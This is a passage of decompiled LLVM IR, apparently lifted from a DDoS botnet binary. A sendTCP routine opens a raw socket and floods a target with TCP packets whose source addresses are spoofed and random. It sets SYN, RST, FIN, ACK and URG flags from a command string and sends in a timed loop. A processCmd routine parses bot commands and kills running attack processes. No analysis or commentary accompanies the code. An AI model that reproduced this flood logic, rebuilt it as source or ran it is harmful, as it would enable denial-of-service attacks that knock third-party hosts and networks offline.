  %v1_cebc = trunc i32 %v3_ceac to i16
  store i16 %v1_cebc, i16* %v4_cda4, align 2
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_cec8 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_cec8, label %dec_label_pc_ced0, label %dec_label_pc_cef4

dec_label_pc_ced0:                                ; preds = %dec_label_pc_ce50
  %v2_ced4 = call i32 @__GI_time(i32* null)
  store i32 %v2_ced4, i32* %r2.global-to-local, align 4
  %v8_cee4 = icmp sgt i32 %v2_ced4, %v2_cdb8
  br i1 %v8_cee4, label %dec_label_pc_cf50, label %dec_label_pc_cee8

dec_label_pc_cee8:                                ; preds = %dec_label_pc_ced0
  br label %dec_label_pc_cdd0

dec_label_pc_cef4:                                ; preds = %dec_label_pc_ce50
  %v1_cef8 = add i32 %stack_var_-112.0, 1
  store i32 %stack_var_-108.0.ph, i32* %r2.global-to-local, align 4
  %v9_cf08 = icmp eq i32 %stack_var_-108.0.ph, %arg7
  br i1 %v9_cf08, label %dec_label_pc_cf10, label %dec_label_pc_cf40

dec_label_pc_cf10:                                ; preds = %dec_label_pc_cef4
  store i32 %v3_cf18, i32* %r2.global-to-local, align 4
  %v1_cf30 = call i32 @usleep(i32 %v3_cf28)
  br label %dec_label_pc_cdd0.outer

dec_label_pc_cf40:                                ; preds = %dec_label_pc_cef4
  %v1_cf44 = add i32 %stack_var_-108.0.ph, 1
  store i32 %v1_cf44, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_cdd0.outer

dec_label_pc_cf50:                                ; preds = %dec_label_pc_ced0, %dec_label_pc_cb74, %dec_label_pc_cb44
  %v1_cf5c30 = phi i32 [ %v5_cb98, %dec_label_pc_cb74 ], [ 0, %dec_label_pc_cb44 ], [ %v2_ced4, %dec_label_pc_ced0 ]
  br label %dec_label_pc_cf54

dec_label_pc_cf54:                                ; preds = %dec_label_pc_cac4, %dec_label_pc_c98c, %dec_label_pc_c9fc, %dec_label_pc_c9d8, %dec_label_pc_cf50
  %v1_cf5c = phi i32 [ %v3_c99c, %dec_label_pc_c98c ], [ 0, %dec_label_pc_c9fc ], [ 0, %dec_label_pc_c9d8 ], [ %v1_cf5c30, %dec_label_pc_cf50 ], [ %v2_cac8, %dec_label_pc_cac4 ]
  ret i32 %v1_cf5c

; uselistorder directives
  uselistorder i32 %v1_cf44, { 1, 0 }
  uselistorder i32 %v1_cef8, { 1, 0 }
  uselistorder i32 %v0_ce5c, { 1, 0 }
  uselistorder i16 %v0_ce1c.sink.off0, { 1, 0 }
  uselistorder i32 %v0_cdf8, { 1, 0 }
  uselistorder i32 %stack_var_-108.0.ph, { 1, 2, 0 }
  uselistorder i32 %v1_cd98, { 1, 0 }
  uselistorder i32 %v3_cd3c, { 1, 0 }
  uselistorder i32 %v0_ccf8, { 1, 0 }
  uselistorder i32 %v1_cce8, { 1, 0 }
  uselistorder i32 %v3_cc68, { 6, 4, 5, 12, 3, 13, 11, 2, 10, 9, 8, 7, 1, 0 }
  uselistorder i32 %v1_cc38, { 1, 0 }
  uselistorder i32 %v1_cb38, { 1, 0 }
  uselistorder i32 %v1_caec, { 1, 0 }
  uselistorder i32 %v3_ca6c, { 1, 0 }
  uselistorder i32 %stack_var_-116.0.ph, { 1, 2, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 2, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32 26, { 1, 0 }
  uselistorder i32 ()* @rand, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 49, { 2, 0, 1 }
  uselistorder i32 (i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg8, { 3, 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_cf54, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_ce50, { 1, 0 }
  uselistorder label %dec_label_pc_cdd0, { 1, 0 }
  uselistorder label %dec_label_pc_cd50, { 1, 0 }
  uselistorder label %dec_label_pc_cc34, { 1, 0 }
  uselistorder label %dec_label_pc_cbb8, { 1, 0 }
  uselistorder label %dec_label_pc_cac4, { 1, 0 }
  uselistorder label %dec_label_pc_ca6c, { 1, 0 }
  uselistorder label %dec_label_pc_c98c, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 53100, i32* %stack_var_-4, align 4
  %v2_cf68 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_cf68, i32* @fp, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v2_cf9c = icmp eq i32 %arg2, 0
  br i1 %v2_cf9c, label %dec_label_pc_cfa4, label %dec_label_pc_cfbc

dec_label_pc_cfa4:                                ; preds = %entry
  %v0_cfa4 = call i32 @rand_cmwc()
  br label %dec_label_pc_cfd8

dec_label_pc_cfbc:                                ; preds = %entry
  %v3_cfc4 = urem i32 %arg2, 65536
  %v1_cfcc = call i32 @__GI_htons(i32 %v3_cfc4)
  br label %dec_label_pc_cfd8

dec_label_pc_cfd8:                                ; preds = %dec_label_pc_cfa4, %dec_label_pc_cfbc
  %v3_cfe8 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  %v2_cff0 = icmp eq i32 %v3_cfe8, 0
  br i1 %v2_cff0, label %dec_label_pc_cffc, label %dec_label_pc_d5f4

dec_label_pc_cffc:                                ; preds = %dec_label_pc_cfd8
  store i32 8, i32* @r2, align 4
  %v2_d010 = bitcast i32* %stack_var_-60 to i8*
  %v3_d010 = call i32 @__GI_memset(i8* %v2_d010, i32 0)
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_d020 = call i32 @socket(i32 2, i32 3, i32 6)
  %v2_d030 = icmp eq i32 %v3_d020, 0
  br i1 %v2_d030, label %dec_label_pc_d5f4, label %dec_label_pc_d03c

dec_label_pc_d03c:                                ; preds = %dec_label_pc_cffc
  store i32 1, i32* %stack_var_-72, align 4
  %v2_d044 = ptrtoint i32* %stack_var_-72 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d060 = call i32 @__GI_setsockopt(i32 %v3_d020, i32 0, i32 3, i32 %v2_d044, i32 4)
  %v1_d068 = icmp slt i32 %v5_d060, 0
  br i1 %v1_d068, label %dec_label_pc_d5f4, label %dec_label_pc_d074

dec_label_pc_d074:                                ; preds = %dec_label_pc_d03c
  %v2_d078 = icmp eq i32 %arg4, 0
  br i1 %v2_d078, label %dec_label_pc_d0a4, label %dec_label_pc_d08c

dec_label_pc_d08c:                                ; preds = %dec_label_pc_d074
  %v1_d090 = sub i32 32, %arg4
  store i32 %v1_d090, i32* %r2.global-to-local, align 4
  %v1_d09c = shl i32 -1, %v1_d090
  br label %dec_label_pc_d0a4

dec_label_pc_d0a4:                                ; preds = %dec_label_pc_d074, %dec_label_pc_d08c
  %storemerge9 = phi i32 [ %v1_d09c, %dec_label_pc_d08c ], [ 0, %dec_label_pc_d074 ]
  %v1_d0a8 = add i32 %arg6, 40
  %v1_d0b8 = add i32 %arg6, 54
  %v3_d0bc = and i32 %v1_d0b8, -8
  %v1_d0c4 = load i32, i32* @sp, align 4
  %v2_d0c4 = sub i32 %v1_d0c4, %v3_d0bc
  %v1_d0d4 = add i32 %v2_d0c4, 15
  %v3_d0d8 = and i32 %v1_d0d4, -8
  store i32 %v3_d0d8, i32* %r2.global-to-local, align 4
  %v1_d0f8 = add i32 %v3_d0d8, 20
  %v5_d0fc = inttoptr i32 %v1_d0f8 to i16*
  %v3_d100 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_d100, i32* @r4, align 4
  %v1_d108 = call i32 @GetRandomIP(i32 %storemerge9)
  %v1_d114 = call i32 @__GI_htonl(i32 %v1_d108)
  store i32 %v1_d114, i32* %r2.global-to-local, align 4
  %v1_d120 = add i32 %arg6, 20
  %v1_d124 = load i32, i32* @sp, align 4
  %v2_d124 = inttoptr i32 %v1_d124 to i32*
  store i32 %v1_d120, i32* %v2_d124, align 4
  %v0_d12c = load i32, i32* @r4, align 4
  %v4_d134 = inttoptr i32 %v3_d0d8 to i8*
  %v5_d134 = call i32 @makeIPPacket(i8* %v4_d134, i32 %v0_d12c, i32 %v1_d114, i32 6)
  %v0_d138 = call i32 @rand_cmwc()
  %v3_d144 = urem i32 %v0_d138, 65536
  store i32 %v3_d144, i32* %r2.global-to-local, align 4
  %v1_d14c = trunc i32 %v0_d138 to i16
  store i16 %v1_d14c, i16* %v5_d0fc, align 4
  %v0_d150 = call i32 @rand_cmwc()
  %v2_d15c = add i32 %v3_d0d8, 24
  %v3_d15c = inttoptr i32 %v2_d15c to i32*
  store i32 %v0_d150, i32* %v3_d15c, align 8
  %v2_d168 = add i32 %v3_d0d8, 28
  %v3_d168 = inttoptr i32 %v2_d168 to i32*
  store i32 0, i32* %v3_d168, align 4
  store i32 %v1_d0f8, i32* %r2.global-to-local, align 4
  %v1_d170 = add i32 %v3_d0d8, 32
  %v2_d170 = inttoptr i32 %v1_d170 to i8*
  %v3_d170 = load i8, i8* %v2_d170, align 8
  %v1_d17c = urem i8 %v3_d170, 16
  %v1_d180 = or i8 %v1_d17c, 80
  store i8 %v1_d180, i8* %v2_d170, align 8
  %v3_d190 = load i32, i32* %stack_var_0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c300.204 to i32), i32* @r1, align 4
  %v3_d19c = inttoptr i32 %v3_d190 to i8*
  %v4_d19c = call i32 @__GI_strcoll(i8* %v3_d19c, i32 ptrtoint ([4 x i8]* @global_var_1c300.204 to i32))
  %v2_d1a4 = icmp eq i32 %v4_d19c, 0
  br i1 %v2_d1a4, label %dec_label_pc_d1ac, label %dec_label_pc_d264

dec_label_pc_d1ac:                                ; preds = %dec_label_pc_d0a4
  store i32 %v1_d0f8, i32* %r2.global-to-local, align 4
  %v1_d1b0 = add i32 %v3_d0d8, 33
  %v2_d1b0 = inttoptr i32 %v1_d1b0 to i8*
  %v3_d1b0 = load i8, i8* %v2_d1b0, align 1
  %v1_d1c0 = or i8 %v3_d1b0, 2
  store i8 %v1_d1c0, i8* %v2_d1b0, align 1
  store i32 %v1_d0f8, i32* %r2.global-to-local, align 4
  %v3_d1d4 = load i8, i8* %v2_d1b0, align 1
  %v1_d1e4 = or i8 %v3_d1d4, 4
  store i8 %v1_d1e4, i8* %v2_d1b0, align 1
  store i32 %v1_d0f8, i32* %r2.global-to-local, align 4
  %v3_d1f8 = load i8, i8* %v2_d1b0, align 1
  %v1_d208 = or i8 %v3_d1f8, 1
  store i8 %v1_d208, i8* %v2_d1b0, align 1
  store i32 %v1_d0f8, i32* %r2.global-to-local, align 4
  %v3_d21c = load i8, i8* %v2_d1b0, align 1
  %v1_d22c = or i8 %v3_d21c, 16
  store i8 %v1_d22c, i8* %v2_d1b0, align 1
  store i32 %v1_d0f8, i32* %r2.global-to-local, align 4
  %v3_d240 = load i8, i8* %v2_d1b0, align 1
  %v1_d250 = or i8 %v3_d240, 8
  store i8 %v1_d250, i8* %v2_d1b0, align 1
  br label %dec_label_pc_d3f0

dec_label_pc_d264:                                ; preds = %dec_label_pc_d0a4
  %v3_d264 = load i32, i32* %stack_var_0, align 4
  %v2_d270 = call i32 @__GI_strtok(i32 %v3_d264, i32 ptrtoint (i32* @global_var_1c304.206 to i32))
  %v2_d3e818 = icmp eq i32 %v2_d270, 0
  br i1 %v2_d3e818, label %dec_label_pc_d3f0, label %dec_label_pc_d280.lr.ph

dec_label_pc_d280.lr.ph:                          ; preds = %dec_label_pc_d264
  %v1_d2a0 = add i32 %v3_d0d8, 33
  %v2_d2a0 = inttoptr i32 %v1_d2a0 to i8*
  br label %dec_label_pc_d280

dec_label_pc_d280:                                ; preds = %dec_label_pc_d280.lr.ph, %dec_label_pc_d3d0
  %storemerge1319 = phi i32 [ %v2_d270, %dec_label_pc_d280.lr.ph ], [ %v2_d3d8, %dec_label_pc_d3d0 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1c308.208 to i32), i32* @r1, align 4
  %v3_d28c = inttoptr i32 %storemerge1319 to i8*
  %v4_d28c = call i32 @__GI_strcoll(i8* %v3_d28c, i32 ptrtoint ([4 x i8]* @global_var_1c308.208 to i32))
  %v2_d294 = icmp eq i32 %v4_d28c, 0
  br i1 %v2_d294, label %dec_label_pc_d29c, label %dec_label_pc_d2c4

dec_label_pc_d29c:                                ; preds = %dec_label_pc_d280
  %v3_d2a0 = load i8, i8* %v2_d2a0, align 1
  %v4_d2a8 = zext i8 %v3_d2a0 to i32
  %v1_d2b0 = or i32 %v4_d2a8, 2
  store i32 %v1_d2b0, i32* %r2.global-to-local, align 4
  %v1_d2bc = trunc i32 %v1_d2b0 to i8
  store i8 %v1_d2bc, i8* %v2_d2a0, align 1
  br label %dec_label_pc_d3d0

dec_label_pc_d2c4:                                ; preds = %dec_label_pc_d280
  store i32 ptrtoint ([4 x i8]* @global_var_1c30c.210 to i32), i32* @r1, align 4
  %v4_d2d0 = call i32 @__GI_strcoll(i8* %v3_d28c, i32 ptrtoint ([4 x i8]* @global_var_1c30c.210 to i32))
  %v2_d2d8 = icmp eq i32 %v4_d2d0, 0
  br i1 %v2_d2d8, label %dec_label_pc_d2e0, label %dec_label_pc_d308

dec_label_pc_d2e0:                                ; preds = %dec_label_pc_d2c4
  %v3_d2e4 = load i8, i8* %v2_d2a0, align 1
  %v4_d2ec = zext i8 %v3_d2e4 to i32
  %v1_d2f4 = or i32 %v4_d2ec, 4
  store i32 %v1_d2f4, i32* %r2.global-to-local, align 4
  %v1_d300 = trunc i32 %v1_d2f4 to i8
  store i8 %v1_d300, i8* %v2_d2a0, align 1
  br label %dec_label_pc_d3d0

dec_label_pc_d308:                                ; preds = %dec_label_pc_d2c4
  store i32 ptrtoint ([4 x i8]* @global_var_1c310.212 to i32), i32* @r1, align 4
  %v4_d314 = call i32 @__GI_strcoll(i8* %v3_d28c, i32 ptrtoint ([4 x i8]* @global_var_1c310.212 to i32))
  %v2_d31c = icmp eq i32 %v4_d314, 0
  br i1 %v2_d31c, label %dec_label_pc_d324, label %dec_label_pc_d34c

dec_label_pc_d324:                                ; preds = %dec_label_pc_d308
  %v3_d328 = load i8, i8* %v2_d2a0, align 1
  %v4_d330 = zext i8 %v3_d328 to i32
  %v1_d338 = or i32 %v4_d330, 1
  store i32 %v1_d338, i32* %r2.global-to-local, align 4
  %v1_d344 = trunc i32 %v1_d338 to i8
  store i8 %v1_d344, i8* %v2_d2a0, align 1
  br label %dec_label_pc_d3d0

dec_label_pc_d34c:                                ; preds = %dec_label_pc_d308
  store i32 ptrtoint ([4 x i8]* @global_var_1c314.214 to i32), i32* @r1, align 4
  %v4_d358 = call i32 @__GI_strcoll(i8* %v3_d28c, i32 ptrtoint ([4 x i8]* @global_var_1c314.214 to i32))
  %v2_d360 = icmp eq i32 %v4_d358, 0
  br i1 %v2_d360, label %dec_label_pc_d368, label %dec_label_pc_d390

dec_label_pc_d368:                                ; preds = %dec_label_pc_d34c
  %v3_d36c = load i8, i8* %v2_d2a0, align 1
  %v4_d374 = zext i8 %v3_d36c to i32
  %v1_d37c = or i32 %v4_d374, 16
  store i32 %v1_d37c, i32* %r2.global-to-local, align 4
  %v1_d388 = trunc i32 %v1_d37c to i8
  store i8 %v1_d388, i8* %v2_d2a0, align 1
  br label %dec_label_pc_d3d0

dec_label_pc_d390:                                ; preds = %dec_label_pc_d34c
  store i32 ptrtoint ([4 x i8]* @global_var_1c318.216 to i32), i32* @r1, align 4
  %v4_d39c = call i32 @__GI_strcoll(i8* %v3_d28c, i32 ptrtoint ([4 x i8]* @global_var_1c318.216 to i32))
  %v2_d3a4 = icmp eq i32 %v4_d39c, 0
  br i1 %v2_d3a4, label %dec_label_pc_d3ac, label %dec_label_pc_d3d0

dec_label_pc_d3ac:                                ; preds = %dec_label_pc_d390
  %v3_d3b0 = load i8, i8* %v2_d2a0, align 1
  %v4_d3b8 = zext i8 %v3_d3b0 to i32
  %v1_d3c0 = or i32 %v4_d3b8, 8
  store i32 %v1_d3c0, i32* %r2.global-to-local, align 4
  %v1_d3cc = trunc i32 %v1_d3c0 to i8
  store i8 %v1_d3cc, i8* %v2_d2a0, align 1
  br label %dec_label_pc_d3d0

dec_label_pc_d3d0:                                ; preds = %dec_label_pc_d390, %dec_label_pc_d368, %dec_label_pc_d324, %dec_label_pc_d2e0, %dec_label_pc_d29c, %dec_label_pc_d3ac
  %v2_d3d8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c304.206 to i32))
  %v2_d3e8 = icmp eq i32 %v2_d3d8, 0
  br i1 %v2_d3e8, label %dec_label_pc_d3f0, label %dec_label_pc_d280

dec_label_pc_d3f0:                                ; preds = %dec_label_pc_d3d0, %dec_label_pc_d264, %dec_label_pc_d1ac
  %v0_d3f0 = call i32 @rand_cmwc()
  %v1_d404 = trunc i32 %v0_d3f0 to i16
  %v3_d404 = add i32 %v3_d0d8, 34
  %v4_d404 = inttoptr i32 %v3_d404 to i16*
  store i16 %v1_d404, i16* %v4_d404, align 2
  %v3_d410 = add i32 %v3_d0d8, 36
  %v4_d410 = inttoptr i32 %v3_d410 to i16*
  store i16 0, i16* %v4_d410, align 4
  store i32 %v1_d0f8, i32* %r2.global-to-local, align 4
  %v3_d41c = add i32 %v3_d0d8, 38
  %v4_d41c = inttoptr i32 %v3_d41c to i16*
  store i16 0, i16* %v4_d41c, align 2
  br i1 %v2_cf9c, label %dec_label_pc_d42c, label %dec_label_pc_d444

dec_label_pc_d42c:                                ; preds = %dec_label_pc_d3f0
  %v0_d42c = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_d42c to i16
  br label %dec_label_pc_d460

dec_label_pc_d444:                                ; preds = %dec_label_pc_d3f0
  %v3_d44c = urem i32 %arg2, 65536
  %v1_d454 = call i32 @__GI_htons(i32 %v3_d44c)
  %extract.t72 = trunc i32 %v1_d454 to i16
  br label %dec_label_pc_d460

dec_label_pc_d460:                                ; preds = %dec_label_pc_d42c, %dec_label_pc_d444
  %v0_d42c.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_d42c ], [ %extract.t72, %dec_label_pc_d444 ]
  %v3_d468 = add i32 %v3_d0d8, 22
  %v4_d468 = inttoptr i32 %v3_d468 to i16*
  store i16 %v0_d42c.sink.off0, i16* %v4_d468, align 2
  %v2_d474 = call i32 @tcpcsum(i32 %v3_d0d8, i32 %v1_d0f8)
  %v1_d484 = trunc i32 %v2_d474 to i16
  store i16 %v1_d484, i16* %v4_d410, align 4
  store i32 %v3_d0d8, i32* %r2.global-to-local, align 4
  %v1_d494 = or i32 %v3_d0d8, 2
  %v2_d494 = inttoptr i32 %v1_d494 to i16*
  %v3_d494 = load i16, i16* %v2_d494, align 2
  %v4_d494 = zext i16 %v3_d494 to i32
  %v2_d4a0 = inttoptr i32 %v3_d0d8 to i16*
  %v3_d4a0 = call i32 @csum(i16* %v2_d4a0, i32 %v4_d494)
  %sext3 = mul i32 %v3_d4a0, 65536
  %v1_d4a4 = sdiv i32 %sext3, 65536
  store i32 %v1_d4a4, i32* %r2.global-to-local, align 4
  %v1_d4b0 = trunc i32 %v1_d4a4 to i16
  %v3_d4b0 = add i32 %v3_d0d8, 10
  %v4_d4b0 = inttoptr i32 %v3_d4b0 to i16*
  store i16 %v1_d4b0, i16* %v4_d4b0, align 2
  %v2_d4b8 = call i32 @__GI_time(i32* null)
  %v2_d4c4 = add i32 %v2_d4b8, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d4d8 = ptrtoint i32* %stack_var_-68 to i32
  %v2_d518 = add i32 %v3_d0d8, 12
  %v3_d518 = inttoptr i32 %v2_d518 to i32*
  %v3_d530 = or i32 %v3_d0d8, 4
  %v4_d530 = inttoptr i32 %v3_d530 to i16*
  br label %dec_label_pc_d4d4

dec_label_pc_d4d4:                                ; preds = %dec_label_pc_d5e4, %dec_label_pc_d5d8, %dec_label_pc_d460
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_d460 ], [ 0, %dec_label_pc_d5d8 ], [ %v1_d5e8, %dec_label_pc_d5e4 ]
  store i32 %v3_d0d8, i32* %r2.global-to-local, align 4
  %v1_d4dc = load i32, i32* @sp, align 4
  %v2_d4dc = inttoptr i32 %v1_d4dc to i32*
  store i32 %v2_d4d8, i32* %v2_d4dc, align 4
  %v1_d4e4 = load i32, i32* @sp, align 4
  %v2_d4e4 = add i32 %v1_d4e4, 4
  %v3_d4e4 = inttoptr i32 %v2_d4e4 to i32*
  store i32 16, i32* %v3_d4e4, align 4
  %v0_d4ec = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_d0a8, i32* %r2.global-to-local, align 4
  %v6_d4f8 = call i32 @__libc_sendto(i32 %v3_d020, i32 %v0_d4ec, i32 %v1_d0a8, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_d500 = call i32 @GetRandomIP(i32 %storemerge9)
  %v1_d50c = call i32 @__GI_htonl(i32 %v1_d500)
  store i32 %v1_d50c, i32* %r2.global-to-local, align 4
  store i32 %v1_d50c, i32* %v3_d518, align 4
  %v0_d51c = call i32 @rand_cmwc()
  %v3_d528 = urem i32 %v0_d51c, 65536
  store i32 %v3_d528, i32* %r2.global-to-local, align 4
  %v1_d530 = trunc i32 %v0_d51c to i16
  store i16 %v1_d530, i16* %v4_d530, align 4
  %v0_d534 = call i32 @rand_cmwc()
  store i32 %v0_d534, i32* %r2.global-to-local, align 4
  store i32 %v0_d534, i32* %v3_d15c, align 8
  %v0_d544 = call i32 @rand_cmwc()
  %v1_d558 = trunc i32 %v0_d544 to i16
  store i16 %v1_d558, i16* %v5_d0fc, align 4
  store i32 %v1_d0f8, i32* %r2.global-to-local, align 4
  store i16 0, i16* %v4_d410, align 4
  %v4_d570 = call i32 @tcpcsum(i32 %v3_d0d8, i32 %v1_d0f8)
  %v1_d580 = trunc i32 %v4_d570 to i16
  store i16 %v1_d580, i16* %v4_d410, align 4
  store i32 %v3_d0d8, i32* %r2.global-to-local, align 4
  %v3_d590 = load i16, i16* %v2_d494, align 2
  %v4_d590 = zext i16 %v3_d590 to i32
  %v3_d59c = call i32 @csum(i16* %v2_d4a0, i32 %v4_d590)
  %sext5 = mul i32 %v3_d59c, 65536
  %v1_d5a0 = sdiv i32 %sext5, 65536
  store i32 %v1_d5a0, i32* %r2.global-to-local, align 4
  %v1_d5ac = trunc i32 %v1_d5a0 to i16
  store i16 %v1_d5ac, i16* %v4_d4b0, align 2
  %v9_d5b8 = icmp eq i32 %stack_var_-92.0, %arg7
  br i1 %v9_d5b8, label %dec_label_pc_d5c0, label %dec_label_pc_d5e4

dec_label_pc_d5c0:                                ; preds = %dec_label_pc_d4d4
  %v2_d5c4 = call i32 @__GI_time(i32* null)
  store i32 %v2_d5c4, i32* %r2.global-to-local, align 4
  %v8_d5d4 = icmp sgt i32 %v2_d5c4, %v2_d4c4
  br i1 %v8_d5d4, label %dec_label_pc_d5f4, label %dec_label_pc_d5d8

dec_label_pc_d5d8:                                ; preds = %dec_label_pc_d5c0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d4d4

dec_label_pc_d5e4:                                ; preds = %dec_label_pc_d4d4
  %v1_d5e8 = add i32 %stack_var_-92.0, 1
  br label %dec_label_pc_d4d4

dec_label_pc_d5f4:                                ; preds = %dec_label_pc_d5c0, %dec_label_pc_d03c, %dec_label_pc_cffc, %dec_label_pc_cfd8
  %v1_d600 = phi i32 [ %v5_d060, %dec_label_pc_d03c ], [ 0, %dec_label_pc_cffc ], [ %v3_cfe8, %dec_label_pc_cfd8 ], [ %v2_d5c4, %dec_label_pc_d5c0 ]
  ret i32 %v1_d600

; uselistorder directives
  uselistorder i32 %v1_d5a0, { 1, 0 }
  uselistorder i32 %v0_d51c, { 1, 0 }
  uselistorder i32 %v1_d4a4, { 1, 0 }
  uselistorder i8* %v2_d2a0, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i8* %v2_d1b0, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v0_d138, { 1, 0 }
  uselistorder i32 %v1_d0f8, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10 }
  uselistorder i32 %v3_d0d8, { 9, 8, 6, 19, 7, 5, 21, 18, 4, 3, 17, 16, 15, 14, 13, 20, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_d0a8, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @__GI_htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d460, { 1, 0 }
  uselistorder label %dec_label_pc_d3d0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_d280, { 1, 0 }
  uselistorder label %dec_label_pc_d0a4, { 1, 0 }
  uselistorder label %dec_label_pc_cfd8, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_d624 = load i32, i32* @r4, align 4
  %v6_d624 = load i32, i32* @r5, align 4
  %v9_d624 = load i32, i32* @r6, align 4
  %v12_d624 = load i32, i32* @r7, align 4
  %v15_d624 = load i32, i32* @r8, align 4
  %v18_d624 = load i32, i32* @fp, align 4
  store i32 54828, i32* %stack_var_-4, align 4
  %v2_d628 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d628, i32* @fp, align 4
  %v2_d63c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1c31c.218 to i32), i32* @r1, align 4
  %v3_d648 = inttoptr i32 %v2_d63c to i8*
  %v4_d648 = call i32 @__GI_strcoll(i8* %v3_d648, i32 ptrtoint ([5 x i8]* @global_var_1c31c.218 to i32))
  %v2_d650 = icmp eq i32 %v4_d648, 0
  br i1 %v2_d650, label %dec_label_pc_e1a0, label %dec_label_pc_d658

dec_label_pc_d658:                                ; preds = %entry
  %v2_d65c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1c324.220 to i32), i32* @r1, align 4
  %v3_d668 = inttoptr i32 %v2_d65c to i8*
  %v4_d668 = call i32 @__GI_strcoll(i8* %v3_d668, i32 ptrtoint ([6 x i8]* @global_var_1c324.220 to i32))
  %v2_d670 = icmp eq i32 %v4_d668, 0
  br i1 %v2_d670, label %dec_label_pc_d678, label %dec_label_pc_d758

dec_label_pc_d678:                                ; preds = %dec_label_pc_d658
  %v1_d67c = add i32 %tmp, 4
  %v1_d680 = inttoptr i32 %v1_d67c to i32*
  %v2_d680 = load i32, i32* %v1_d680, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c32c.222 to i32), i32* @r1, align 4
  %v3_d68c = inttoptr i32 %v2_d680 to i8*
  %v4_d68c = call i32 @__GI_strcoll(i8* %v3_d68c, i32 ptrtoint ([4 x i8]* @global_var_1c32c.222 to i32))
  %v2_d694 = icmp eq i32 %v4_d68c, 0
  br i1 %v2_d694, label %dec_label_pc_d69c, label %dec_label_pc_d6cc

dec_label_pc_d69c:                                ; preds = %dec_label_pc_d678
  %v2_d6a0 = load i32, i32* @global_var_2c704.224, align 4
  %v2_d6a4 = icmp eq i32 %v2_d6a0, 0
  br i1 %v2_d6a4, label %dec_label_pc_e1a0, label %dec_label_pc_d6ac

dec_label_pc_d6ac:                                ; preds = %dec_label_pc_d69c
  %v2_d6bc = call i32 @kill(i32 %v2_d6a0, i32 9)
  store i32 0, i32* @global_var_2c704.224, align 4
  br label %dec_label_pc_d6cc

